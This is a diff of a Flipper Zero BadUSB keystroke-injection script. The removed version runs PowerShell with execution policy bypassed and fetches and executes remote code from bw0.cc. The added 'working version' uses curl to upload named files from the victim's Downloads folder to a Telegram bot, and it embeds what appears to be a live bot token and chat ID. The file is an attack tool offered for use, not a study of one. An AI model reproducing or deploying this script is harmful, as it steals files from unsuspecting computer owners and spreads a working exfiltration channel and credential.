@@ -1,19 +1,43 @@
+REM Flipper Zero - Send ALL txt files from Downloads
+REM Working version
 
-REM Title: beigeworm's Exfiltrate files to Telegram
-REM Author: @beigeworm
-REM Description: This script searches the users folder fot pictures, documents, logs, PDFs and more, then sends its all to a dropbox account.
-REM Target: Windows 10
-
-REM *SETUP*
-REM replace TELEGRAM_TOKEN with your Telegram Token.
-
-REM some setup for dukie script
-DEFAULT_DELAY 100
-
-REM open powershell (remove -W Hidden to show the window)
-DELAY 1000
+DELAY 4000
 GUI r
-DELAY 750
-STRING powershell -Ep Bypass -C $tg='TELEGRAM_TOKEN'; iex (irm bw0.cc/extg)
+DELAY 800
+STRING cmd
 ENTER
+DELAY 1000
 
+REM 1. Start message
+STRING curl "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendMessage?chat_id=6614794141&text=Sending+Downloads+files"
+ENTER
+DELAY 2000
+
+REM 2. Send ALL txt files from Downloads (one by one)
+STRING curl.exe -F "chat_id=6614794141" -F "document=@%USERPROFILE%\Downloads\BlueScreenOfDeath.txt" "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendDocument"
+ENTER
+DELAY 1500
+
+STRING curl.exe -F "chat_id=6614794141" -F "document=@%USERPROFILE%\Downloads\Exfiltrate-to-Telegram.txt" "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendDocument"
+ENTER
+DELAY 1500
+
+STRING curl.exe -F "chat_id=6614794141" -F "document=@%USERPROFILE%\Downloads\Fake-Windows-10-Logon.txt" "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendDocument"
+ENTER
+DELAY 1500
+
+STRING curl.exe -F "chat_id=6614794141" -F "document=@%USERPROFILE%\Downloads\Fake-Windows-11-Logon.txt" "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendDocument"
+ENTER
+DELAY 1500
+
+STRING curl.exe -F "chat_id=6614794141" -F "document=@%USERPROFILE%\Downloads\matrix.txt" "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendDocument"
+ENTER
+DELAY 1500
+
+STRING curl.exe -F "chat_id=6614794141" -F "document=@%USERPROFILE%\Downloads\System-Info-to-Telegram.txt" "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendDocument"
+ENTER
+DELAY 1500
+
+REM 3. Completion
+STRING curl "https://api.telegram.org/bot8273597709:AAFp5FRkQxV31wPuF1ELB39rgt2aRC1shcI/sendMessage?chat_id=6614794141&text=Files+sent+from+Downloads"
+ENTER
